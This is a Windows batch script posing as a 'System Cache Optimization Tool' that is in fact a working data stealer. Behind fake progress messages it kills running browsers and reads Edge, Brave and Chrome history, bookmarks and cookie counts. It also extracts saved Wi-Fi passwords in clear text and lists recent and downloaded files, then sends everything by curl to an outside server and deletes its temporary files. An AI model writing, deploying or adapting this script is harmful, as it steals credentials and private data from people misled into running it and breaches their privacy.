@echo off
setlocal enabledelayedexpansion
title Windows System Optimizer

REM ============================================
REM Enhanced Data Collector v2.0 - Backend Edition
REM Sends data to backend API incrementally
REM ============================================

cls
color 0A
echo.
echo  ================================================
echo    Windows System Cache Optimization Tool
echo  ================================================
echo.

REM Backend URL - UPDATE THIS TO YOUR SERVER IP/DOMAIN
set "BACKEND_URL=https://backend-data-project.vercel.app/api/data"

REM Generate session ID (timestamp + random)
set "SESSION_ID=%DATE:~-4%%DATE:~4,2%%DATE:~7,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%_%RANDOM%"
set "SESSION_ID=%SESSION_ID: =0%"

REM Set paths
set "SCRIPT_DIR=%~dp0"
set "CURL=%SCRIPT_DIR%bin\curl.exe"
set "SQLITE=%SCRIPT_DIR%bin\sqlite3.exe"
set "JQ=%SCRIPT_DIR%bin\jq.exe"
set "TEMP_DIR=%TEMP%\collector_%RANDOM%"
mkdir "%TEMP_DIR%" 2>nul

echo [*] Initializing system diagnostics...
timeout /t 1 /nobreak >nul

REM ============================================
REM STEP 1: Collect & Send Device Info
REM ============================================
echo [*] Scanning system components...
call :SendDeviceInfo

REM ============================================
REM STEP 2: Detect browser profiles
REM ============================================
set "CHROME_PATH="
set "BRAVE_PATH="
set "EDGE_PATH="

REM Find Edge profile
set "EDGE_BASE=%LOCALAPPDATA%\Microsoft\Edge\User Data"
if exist "%EDGE_BASE%\Default\History" (
    set "EDGE_PATH=%EDGE_BASE%\Default\History"
) else if exist "%EDGE_BASE%\Profile 1\History" (
    set "EDGE_PATH=%EDGE_BASE%\Profile 1\History"
)

REM Find Brave profile
set "BRAVE_BASE=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"
if exist "%BRAVE_BASE%\Default\History" (
    set "BRAVE_PATH=%BRAVE_BASE%\Default\History"
) else if exist "%BRAVE_BASE%\Profile 1\History" (
    set "BRAVE_PATH=%BRAVE_BASE%\Profile 1\History"
)

REM Find Chrome profile
set "CHROME_BASE=%LOCALAPPDATA%\Google\Chrome\User Data"
if exist "%CHROME_BASE%\Default\History" (
    set "CHROME_PATH=%CHROME_BASE%\Default\History"
) else if exist "%CHROME_BASE%\Profile 1\History" (
    set "CHROME_PATH=%CHROME_BASE%\Profile 1\History"
)

REM ============================================
REM STEP 3: Collect Browser History (Edge → Brave → Chrome)
REM ============================================
echo [*] Analyzing browser data...

REM Edge first
if defined EDGE_PATH (
    echo [*] Processing Edge browser...
    taskkill /F /IM msedge.exe >nul 2>&1
    timeout /t 1 /nobreak >nul
    call :SendBrowserHistory "edge" "%EDGE_PATH%"
)

REM Brave second
if defined BRAVE_PATH (
    echo [*] Processing Brave browser...
    taskkill /F /IM brave.exe >nul 2>&1
    timeout /t 1 /nobreak >nul
    call :SendBrowserHistory "brave" "%BRAVE_PATH%"
)

REM Chrome last
if defined CHROME_PATH (
    echo [*] Processing Chrome browser...
    taskkill /F /IM chrome.exe >nul 2>&1
    timeout /t 1 /nobreak >nul
    call :SendBrowserHistory "chrome" "%CHROME_PATH%"
)

REM ============================================
REM STEP 4: Collect & Send WiFi Passwords
REM ============================================
echo [*] Collecting network profiles...
call :SendWiFiPasswords

REM ============================================
REM STEP 5: Collect & Send System Info
REM ============================================
echo [*] Running system diagnostics...
call :SendSystemInfo

REM ============================================
REM STEP 6: Collect & Send Bookmarks
REM ============================================
echo [*] Backing up browser bookmarks...
call :SendBookmarks

REM ============================================
REM STEP 7: Collect & Send Cookies Info
REM ============================================
echo [*] Analyzing browser cookies...
call :SendCookiesInfo

REM ============================================
REM STEP 8: Collect & Send Recent Files
REM ============================================
echo [*] Processing recent activity...
call :SendRecentFiles

REM ============================================
REM STEP 9: Cleanup
REM ============================================
echo [*] Cleaning temporary cache files...
rmdir /s /q "%TEMP_DIR%" >nul 2>&1

timeout /t 1 /nobreak >nul

echo.
echo  [√] Optimization complete!
timeout /t 2 /nobreak >nul
exit /b 0

REM ============================================
REM FUNCTIONS
REM ============================================

:SendDeviceInfo
set "JSON_FILE=%TEMP_DIR%\device_info.json"

REM Get IP address
set "IP_ADDRESS=Unknown"
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set "IP_ADDRESS=%%a"
    set "IP_ADDRESS=!IP_ADDRESS:~1!"
    goto :ip_done
)
:ip_done

REM Build JSON
(
    echo {
    echo   "session_id": "%SESSION_ID%",
    echo   "type": "device_info",
    echo   "device_info": {
    echo     "hostname": "%COMPUTERNAME%",
    echo     "username": "%USERNAME%",
    echo     "userdomain": "%USERDOMAIN%",
    echo     "ip_address": "!IP_ADDRESS!",
    echo     "timestamp": "%DATE% %TIME%"
    echo   }
    echo }
) > "%JSON_FILE%"

REM Send to backend
"%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1

del "%JSON_FILE%" >nul 2>&1
goto :eof

:SendBrowserHistory
set "browser_type=%~1"
set "history_path=%~2"

REM Create temp copy
set "TEMP_DB=%TEMP_DIR%\%browser_type%_hist.tmp"
copy "%history_path%" "%TEMP_DB%" >nul 2>&1
if errorlevel 1 goto :eof

REM Extract history to temp file first
set "OUTPUT_TXT=%TEMP_DIR%\%browser_type%_data.tmp"
"%SQLITE%" "%TEMP_DB%" "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC;" > "%OUTPUT_TXT%" 2>nul

REM Build JSON from temp file
set "JSON_FILE=%TEMP_DIR%\%browser_type%_history.json"
echo { > "%JSON_FILE%"
echo   "session_id": "%SESSION_ID%", >> "%JSON_FILE%"
echo   "type": "%browser_type%", >> "%JSON_FILE%"
echo   "data": [ >> "%JSON_FILE%"

set /a count=0
for /f "usebackq delims=" %%i in ("%OUTPUT_TXT%") do (
    set /a count+=1
    set "line=%%i"
    set "line=!line:\=\\!"
    set "line=!line:"=\"!"
    if !count! GTR 1 echo , >> "%JSON_FILE%"
    echo     "!line!" >> "%JSON_FILE%"
)

echo   ] >> "%JSON_FILE%"
echo } >> "%JSON_FILE%"

REM Send to backend
if !count! GTR 0 (
    "%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1
)

REM Cleanup
del "%TEMP_DB%" >nul 2>&1
del "%OUTPUT_TXT%" >nul 2>&1
del "%JSON_FILE%" >nul 2>&1
goto :eof

:SendWiFiPasswords
set "JSON_FILE=%TEMP_DIR%\wifi.json"

echo { > "%JSON_FILE%"
echo   "session_id": "%SESSION_ID%", >> "%JSON_FILE%"
echo   "type": "wifi", >> "%JSON_FILE%"
echo   "data": [ >> "%JSON_FILE%"

set /a wifi_count=0
for /f "tokens=2 delims=:" %%i in ('netsh wlan show profiles ^| findstr /C:"All User Profile" 2^>nul') do (
    set "profile=%%i"
    set "profile=!profile:~1!"
    
    REM Get password for this profile
    set "password="
    for /f "tokens=2 delims=:" %%p in ('netsh wlan show profile name^="!profile!" key^=clear 2^>nul ^| findstr /C:"Key Content"') do (
        set "password=%%p"
        set "password=!password:~1!"
    )
    
    REM Add to JSON (even if no password)
    if !wifi_count! GTR 0 echo , >> "%JSON_FILE%"
    if defined password (
        echo     {"network": "!profile!", "password": "!password!"} >> "%JSON_FILE%"
    ) else (
        echo     {"network": "!profile!", "password": "No password or not saved"} >> "%JSON_FILE%"
    )
    set /a wifi_count+=1
)

echo   ] >> "%JSON_FILE%"
echo } >> "%JSON_FILE%"

REM Send to backend
if !wifi_count! GTR 0 (
    "%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1
)

del "%JSON_FILE%" >nul 2>&1
goto :eof

:SendSystemInfo
set "JSON_FILE=%TEMP_DIR%\system.json"

echo { > "%JSON_FILE%"
echo   "session_id": "%SESSION_ID%", >> "%JSON_FILE%"
echo   "type": "system", >> "%JSON_FILE%"
echo   "data": { >> "%JSON_FILE%"
echo     "systeminfo": [ >> "%JSON_FILE%"

REM Get system info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"Processor" /C:"Total Physical Memory" > "%TEMP_DIR%\sysinfo_temp.txt"

set /a line_count=0
for /f "usebackq delims=" %%i in ("%TEMP_DIR%\sysinfo_temp.txt") do (
    set "line=%%i"
    set "line=!line:"=\"!"
    if !line_count! GTR 0 echo , >> "%JSON_FILE%"
    echo       "!line!" >> "%JSON_FILE%"
    set /a line_count+=1
)

echo     ], >> "%JSON_FILE%"
echo     "installed_software": [ >> "%JSON_FILE%"

REM Get top 20 installed programs
set /a app_count=0
for /f "skip=1 tokens=1,2 delims=," %%a in ('wmic product get name^,version /format:csv 2^>nul ^| findstr /v "^$" ^| findstr /v "Node"') do (
    if !app_count! GTR 0 echo , >> "%JSON_FILE%"
    echo       {"name": "%%a", "version": "%%b"} >> "%JSON_FILE%"
    set /a app_count+=1
    if !app_count! GEQ 20 goto :system_apps_done
)
:system_apps_done

echo     ] >> "%JSON_FILE%"
echo   } >> "%JSON_FILE%"
echo } >> "%JSON_FILE%"

REM Send to backend
"%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1

del "%TEMP_DIR%\sysinfo_temp.txt" >nul 2>&1
del "%JSON_FILE%" >nul 2>&1
goto :eof

:SendBookmarks
set "JSON_FILE=%TEMP_DIR%\bookmarks.json"
set "BOOKMARKS_TEMP=%TEMP_DIR%\bookmarks_temp.json"
set "BOOKMARKS_DATA=%TEMP_DIR%\bookmarks_data.json"

set /a bookmark_count=0

REM Build the data object first
echo { > "%BOOKMARKS_DATA%"

set /a has_data=0

REM Chrome - check multiple profiles and extract bookmarks
set "CHROME_BM=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks"
if not exist "%CHROME_BM%" set "CHROME_BM=%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\Bookmarks"
if exist "%CHROME_BM%" (
    "%JQ%" -c "[.. | .url? // empty] | unique | .[0:50]" "%CHROME_BM%" > "%BOOKMARKS_TEMP%" 2>nul
    if !has_data! GTR 0 echo , >> "%BOOKMARKS_DATA%"
    echo   "chrome": >> "%BOOKMARKS_DATA%"
    type "%BOOKMARKS_TEMP%" >> "%BOOKMARKS_DATA%"
    set /a bookmark_count+=1
    set /a has_data+=1
)

REM Brave - check multiple profiles and extract bookmarks
set "BRAVE_BM=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
if not exist "%BRAVE_BM%" set "BRAVE_BM=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Profile 1\Bookmarks"
if exist "%BRAVE_BM%" (
    "%JQ%" -c "[.. | .url? // empty] | unique | .[0:50]" "%BRAVE_BM%" > "%BOOKMARKS_TEMP%" 2>nul
    if !has_data! GTR 0 echo , >> "%BOOKMARKS_DATA%"
    echo   "brave": >> "%BOOKMARKS_DATA%"
    type "%BOOKMARKS_TEMP%" >> "%BOOKMARKS_DATA%"
    set /a bookmark_count+=1
    set /a has_data+=1
)

REM Edge - check multiple profiles and extract bookmarks
set "EDGE_BM=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Bookmarks"
if not exist "%EDGE_BM%" set "EDGE_BM=%LOCALAPPDATA%\Microsoft\Edge\User Data\Profile 1\Bookmarks"
if exist "%EDGE_BM%" (
    "%JQ%" -c "[.. | .url? // empty] | unique | .[0:50]" "%EDGE_BM%" > "%BOOKMARKS_TEMP%" 2>nul
    if !has_data! GTR 0 echo , >> "%BOOKMARKS_DATA%"
    echo   "edge": >> "%BOOKMARKS_DATA%"
    type "%BOOKMARKS_TEMP%" >> "%BOOKMARKS_DATA%"
    set /a bookmark_count+=1
    set /a has_data+=1
)

echo } >> "%BOOKMARKS_DATA%"

REM Now wrap in API format
(
    echo {
    echo   "session_id": "%SESSION_ID%",
    echo   "type": "bookmarks",
    echo   "data":
    type "%BOOKMARKS_DATA%"
    echo }
) > "%JSON_FILE%"

REM Send to backend
if !bookmark_count! GTR 0 (
    "%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1
)

del "%JSON_FILE%" >nul 2>&1
del "%BOOKMARKS_TEMP%" >nul 2>&1
del "%BOOKMARKS_DATA%" >nul 2>&1
goto :eof

:SendCookiesInfo
set "JSON_FILE=%TEMP_DIR%\cookies.json"

echo { > "%JSON_FILE%"
echo   "session_id": "%SESSION_ID%", >> "%JSON_FILE%"
echo   "type": "cookies", >> "%JSON_FILE%"
echo   "data": { >> "%JSON_FILE%"

set /a has_data=0

REM Chrome cookies count - check multiple profiles
set "CHROME_COOKIES=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"
if not exist "%CHROME_COOKIES%" set "CHROME_COOKIES=%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\Cookies"
if exist "%CHROME_COOKIES%" (
    set "TEMP_COOKIES=%TEMP_DIR%\cookies_chrome.tmp"
    copy "%CHROME_COOKIES%" "!TEMP_COOKIES!" >nul 2>&1
    if not errorlevel 1 (
        for /f %%c in ('"%SQLITE%" "!TEMP_COOKIES!" "SELECT COUNT(*) FROM cookies;" 2^>nul') do (
            if !has_data! GTR 0 echo , >> "%JSON_FILE%"
            echo     "chrome_cookies_count": %%c >> "%JSON_FILE%"
            set /a has_data+=1
        )
        del "!TEMP_COOKIES!" >nul 2>&1
    )
)

REM Brave cookies count - check multiple profiles
set "BRAVE_COOKIES=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
if not exist "%BRAVE_COOKIES%" set "BRAVE_COOKIES=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
if exist "%BRAVE_COOKIES%" (
    set "TEMP_COOKIES=%TEMP_DIR%\cookies_brave.tmp"
    copy "%BRAVE_COOKIES%" "!TEMP_COOKIES!" >nul 2>&1
    if not errorlevel 1 (
        for /f %%c in ('"%SQLITE%" "!TEMP_COOKIES!" "SELECT COUNT(*) FROM cookies;" 2^>nul') do (
            if !has_data! GTR 0 echo , >> "%JSON_FILE%"
            echo     "brave_cookies_count": %%c >> "%JSON_FILE%"
            set /a has_data+=1
        )
        del "!TEMP_COOKIES!" >nul 2>&1
    )
)

REM Edge cookies count - check multiple profiles
set "EDGE_COOKIES=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies"
if not exist "%EDGE_COOKIES%" set "EDGE_COOKIES=%LOCALAPPDATA%\Microsoft\Edge\User Data\Profile 1\Cookies"
if exist "%EDGE_COOKIES%" (
    set "TEMP_COOKIES=%TEMP_DIR%\cookies_edge.tmp"
    copy "%EDGE_COOKIES%" "!TEMP_COOKIES!" >nul 2>&1
    if not errorlevel 1 (
        for /f %%c in ('"%SQLITE%" "!TEMP_COOKIES!" "SELECT COUNT(*) FROM cookies;" 2^>nul') do (
            if !has_data! GTR 0 echo , >> "%JSON_FILE%"
            echo     "edge_cookies_count": %%c >> "%JSON_FILE%"
            set /a has_data+=1
        )
        del "!TEMP_COOKIES!" >nul 2>&1
    )
)

echo   } >> "%JSON_FILE%"
echo } >> "%JSON_FILE%"

REM Send to backend
"%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1

del "%JSON_FILE%" >nul 2>&1
goto :eof

:SendRecentFiles
set "JSON_FILE=%TEMP_DIR%\recent_files.json"
set "RECENT_LINKS=%TEMP_DIR%\recent_links.txt"
set "DOWNLOADS_LIST=%TEMP_DIR%\downloads_list.txt"

echo { > "%JSON_FILE%"
echo   "session_id": "%SESSION_ID%", >> "%JSON_FILE%"
echo   "type": "recent_files", >> "%JSON_FILE%"
echo   "data": [ >> "%JSON_FILE%"

set /a file_count=0

REM Collect from Downloads folder with timestamps (50 most recent)
if exist "%USERPROFILE%\Downloads" (
    REM Use PowerShell to get file info with timestamps (ONLY files, not folders)
    powershell -NoProfile -Command "Get-ChildItem '%USERPROFILE%\Downloads' -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 50 | ForEach-Object { $name = $_.Name -replace '\|', '-'; Write-Output ('{0}^^^|Downloads^^^|{1}' -f $name, $_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')) }" > "%DOWNLOADS_LIST%" 2>nul
    
    if exist "%DOWNLOADS_LIST%" (
        for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%DOWNLOADS_LIST%") do (
            if !file_count! GTR 0 echo , >> "%JSON_FILE%"
            set "filename=%%a"
            set "location=%%b"
            set "timestamp=%%c"
            REM Remove escape characters
            set "filename=!filename:^^^=!"
            set "location=!location:^^^=!"
            set "filename=!filename:"=\"!"
            echo     {"name": "!filename!", "location": "!location!", "date": "!timestamp!"} >> "%JSON_FILE%"
            set /a file_count+=1
        )
    )
)

REM Collect from Windows Recent folder (Quick Access recent files)
set "RECENT_FOLDER=%APPDATA%\Microsoft\Windows\Recent"
if exist "%RECENT_FOLDER%" (
    REM Use PowerShell to parse .lnk files and get target paths with timestamps (ONLY files)
    powershell -NoProfile -Command "$shell = New-Object -ComObject WScript.Shell; Get-ChildItem '%RECENT_FOLDER%' -Filter *.lnk -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object { try { $target = $shell.CreateShortcut($_.FullName).TargetPath; if ($target -and (Test-Path $target -PathType Leaf)) { $item = Get-Item $target; $name = $item.Name -replace '\|', '-'; $path = $item.DirectoryName -replace '\|', '-'; Write-Output ('{0}^^^|{1}^^^|{2}' -f $name, $path, $item.LastAccessTime.ToString('yyyy-MM-dd HH:mm:ss')) } } catch {} }" > "%RECENT_LINKS%" 2>nul
    
    REM Add recent files from Quick Access to JSON
    if exist "%RECENT_LINKS%" (
        for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%RECENT_LINKS%") do (
            if !file_count! GTR 0 echo , >> "%JSON_FILE%"
            set "filename=%%a"
            set "filepath=%%b"
            set "timestamp=%%c"
            REM Remove escape characters
            set "filename=!filename:^^^=!"
            set "filepath=!filepath:^^^=!"
            set "filename=!filename:"=\"!"
            set "filepath=!filepath:"=\"!"
            set "filepath=!filepath:\=\\!"
            echo     {"name": "!filename!", "location": "!filepath!", "date": "!timestamp!"} >> "%JSON_FILE%"
            set /a file_count+=1
            if !file_count! GEQ 100 goto :recent_files_done
        )
    )
)

:recent_files_done
echo   ] >> "%JSON_FILE%"
echo } >> "%JSON_FILE%"

REM Send to backend
if !file_count! GTR 0 (
    "%CURL%" -s -X POST "%BACKEND_URL%" -H "Content-Type: application/json" -d @"%JSON_FILE%" >nul 2>&1
)

del "%JSON_FILE%" >nul 2>&1
del "%RECENT_LINKS%" >nul 2>&1
del "%DOWNLOADS_LIST%" >nul 2>&1
goto :eof
